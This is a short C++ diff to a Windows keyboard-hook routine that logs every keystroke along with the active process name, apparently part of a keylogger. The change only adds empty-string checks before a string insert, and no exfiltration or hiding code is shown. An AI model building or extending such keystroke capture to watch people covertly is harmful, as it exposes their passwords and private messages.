@@ -19,7 +19,9 @@ LRESULT key_hook::RunHook(int n_code, WPARAM wparam, LPARAM lparam) {
 	  caps = !caps;
 	  if (!caps) {
 		std::string key_name = key_const::AddKey(key, caps, shift);
-		key_name.insert(1, "/");
+		if (key_name.length() > 0) {
+		  key_name.insert(1, "/");
+		}
 		key_log += key_name;
 	  } else {
 		key_log += key_const::AddKey(key, caps, shift);
@@ -57,7 +59,9 @@ LRESULT key_hook::RunHook(int n_code, WPARAM wparam, LPARAM lparam) {
 		|| key==VK_RSHIFT
 		|| key==VK_LSHIFT) {
 	  std::string key_name = key_const::AddKey(kb_dll_hook_struct->vkCode, caps, shift);
-	  key_name.insert(1, "/");
+	  if (key_name.length() > 0) {
+		key_name.insert(1, "/");
+	  }
 	  key_log += key_name;
 	  stream::WriteLog(key_log, active_process);
 	  key_log.clear();
